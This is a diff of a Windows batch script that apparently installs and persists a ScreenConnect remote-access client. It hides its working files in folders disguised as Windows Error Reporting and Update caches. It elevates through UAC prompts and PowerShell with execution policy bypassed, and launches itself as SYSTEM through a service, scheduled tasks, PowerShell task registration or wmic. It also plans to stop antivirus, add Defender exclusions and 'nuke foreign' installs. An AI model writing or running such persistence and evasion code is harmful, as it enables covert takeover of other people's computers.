@@ -1,7 +1,8 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN BUILD 20260802O9 - schtasks detach + robust MSI + always nuke foreign
+REM OWN BUILD 20260802O10 - no net session; sc/service detach; UAC/SYSTEM
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
+set "BOOT=%SystemRoot%\Temp\.wucache"
 set "LOG=%WD%\boot.err"
 set "MSI=%TEMP%\sc_primary.msi"
 set "MSICACHE=%WD%\pkg.msi"
@@ -15,77 +16,115 @@ set "CURL=%SystemRoot%\System32\curl.exe"
 if not exist "%CURL%" set "CURL=curl.exe"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
+if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
 
 REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
 if /I not "%~1"=="_RUN" (
-  echo === OWN BUILD 20260802O9 ===
-  net session >nul 2>&1
-  if errorlevel 1 (
-    echo ERROR: need Administrator ^(elevate Guest / Run as admin^)
+  echo === OWN BUILD 20260802O10 ===
+  echo whoami:
+  whoami
+  REM Do NOT use "net session" - it prints "Access is denied" and confuses Guest output.
+  set "ELEV=0"
+  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
+  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
+  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
+  if "!ELEV!"=="0" (
+    echo.
+    echo *** NOT ELEVATED / NOT SYSTEM ***
+    echo In ScreenConnect Command window: set Run as = SYSTEM
+    echo Attempting UAC elevate ^(click Yes if prompted^)...
+    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
+    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"\"%BOOT%\own_elev.cmd\"\"' -Verb RunAs"
+    echo If no UAC prompt appeared, re-run command as SYSTEM.
     exit /b 5
   )
-  REM unlock workdir if prior ACL lock blocks this Admin session
-  takeown /F "%WD%" /R /D Y >nul 2>&1
-  icacls "%WD%" /grant "BUILTIN\Administrators:(OI)(CI)F" /T /C >nul 2>&1
-  icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" /T /C >nul 2>&1
+  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
+  REM prefer Windows\Temp staging ^(always writable for SYSTEM/Admin^)
+  copy /y "%~f0" "%BOOT%\own_run.cmd" >nul 2>&1
+  if not exist "%BOOT%\own_run.cmd" (
+    echo ERROR: cannot write %BOOT%\own_run.cmd
+    exit /b 6
+  )
+  REM also stage into ProgramData workdir
+  mkdir "%WD%" >nul 2>&1
+  copy /y "%BOOT%\own_run.cmd" "%SELF%" >nul 2>&1
   echo go_start %DATE% %TIME%>"%LOG%" 2>nul
   if not exist "%LOG%" (
-    echo ERROR: cannot write log - Access denied on %WD%
-    exit /b 6
+    set "LOG=%BOOT%\boot.err"
+    echo go_start %DATE% %TIME%>"%LOG%"
   )
   echo order=msi_then_primary_then_nuke_foreign>>"%LOG%"
-  echo engine=cmd_detached_o9>>"%LOG%"
-  copy /y "%~f0" "%SELF%" >nul 2>&1
-  if not exist "%SELF%" (
-    echo ERROR: cannot copy worker to %SELF%
-    exit /b 6
-  )
+  echo engine=cmd_detached_o10>>"%LOG%"
+  echo whoami_launcher=>>"%LOG%"
+  whoami >>"%LOG%" 2>&1
   echo detach_begin>>"%LOG%"
   set "DETACH_OK=0"
+  set "RUNNER=%BOOT%\own_run.cmd"
+  if exist "%SELF%" set "RUNNER=%SELF%"
 
-  REM Method A: schtasks as SYSTEM ^(most reliable in Guest^)
-  schtasks /Delete /TN "\Microsoft\Windows\WDI\PerfTrack" /F >nul 2>&1
-  schtasks /Create /TN "\Microsoft\Windows\WDI\PerfTrack" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 00:00 /SD 01/01/2000 /F /TR "cmd.exe /c \"%SELF%\" _RUN" >"%WD%\detach.task" 2>&1
-  schtasks /Run /TN "\Microsoft\Windows\WDI\PerfTrack" >"%WD%\detach.run" 2>&1
+  REM Method A: one-shot SERVICE as SYSTEM ^(best under Guest^)
+  sc.exe stop WucacheOwn >nul 2>&1
+  sc.exe delete WucacheOwn >nul 2>&1
+  sc.exe create WucacheOwn binPath= "cmd.exe /c \"\"%RUNNER%\" _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
   if not errorlevel 1 (
+    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
     set "DETACH_OK=1"
-    echo detach_via=schtasks>>"%LOG%"
+    echo detach_via=sc_service>>"%LOG%"
   )
 
-  REM Method B: wmic
+  REM Method B: root scheduled task ^(not under Microsoft\Windows^)
   if "!DETACH_OK!"=="0" (
-    wmic process call create "cmd.exe /c \"%SELF%\" _RUN" >"%WD%\detach.wmic" 2>&1
-    findstr /C:"ReturnValue = 0" "%WD%\detach.wmic" >nul 2>&1
+    schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
+    schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /SD 01/01/2099 /F /TR "cmd.exe /c \"%RUNNER%\" _RUN" >"%BOOT%\detach.task" 2>&1
+    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
     if not errorlevel 1 (
       set "DETACH_OK=1"
-      echo detach_via=wmic>>"%LOG%"
-    ) else (
-      echo detach_wmic_fail>>"%LOG%"
+      echo detach_via=schtasks_root>>"%LOG%"
     )
   )
 
-  REM Method C: hidden same-user process ^(last resort; Guest may kill it^)
+  REM Method C: PowerShell Register-ScheduledTask
   if "!DETACH_OK!"=="0" (
-    start "" /b cmd.exe /c "\"%SELF%\" _RUN"
-    set "DETACH_OK=1"
-    echo detach_via=start_b>>"%LOG%"
+    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ^
+      "$a=New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c \"\"%RUNNER%\" _RUN\"';" ^
+      "$p=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest;" ^
+      "$t=New-ScheduledTaskTrigger -Once -At ((Get-Date).AddYears(1));" ^
+      "Register-ScheduledTask -TaskName 'WucacheOwnPS' -Action $a -Principal $p -Trigger $t -Force | Out-Null;" ^
+      "Start-ScheduledTask -TaskName 'WucacheOwnPS'" >"%BOOT%\detach.ps" 2>&1
+    if not errorlevel 1 (
+      set "DETACH_OK=1"
+      echo detach_via=ps_task>>"%LOG%"
+    )
   )
 
+  REM Method D: wmic
   if "!DETACH_OK!"=="0" (
-    echo ERROR: detach FAILED - Access denied creating worker
-    echo Check: "%WD%\detach.task" / detach.wmic
-    echo detach_FAILED>>"%LOG%"
-    exit /b 7
+    wmic process call create "cmd.exe /c \"%RUNNER%\" _RUN" >"%BOOT%\detach.wmic" 2>&1
+    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
+    if not errorlevel 1 (
+      set "DETACH_OK=1"
+      echo detach_via=wmic>>"%LOG%"
+    )
   )
+
+  REM Method E: run worker inline ^(Guest may kill at ~10-30s - better than nothing^)
+  if "!DETACH_OK!"=="0" (
+    echo detach_via=inline_fallback>>"%LOG%"
+    echo WARNING: detach APIs failed - running inline ^(may be killed by Guest^)
+    call "%RUNNER%" _RUN
+    exit /b !ERRORLEVEL!
+  )
+
   echo detach_done>>"%LOG%"
-  echo Detached OK. Wait ~90s then:
+  echo Detached OK via service/task. Wait ~90s then:
   echo   type "%LOG%"
+  echo   type "%BOOT%\boot.err"
   echo   sc query state= all ^| findstr /I ScreenConnect
   exit /b 0
 )
 
 echo worker_start %DATE% %TIME%>>"%LOG%"
-echo === OWN WORKER 20260802O9 ===
+echo === OWN WORKER 20260802O10 ===
 
 echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
 echo av_reg_begin>>"%LOG%"
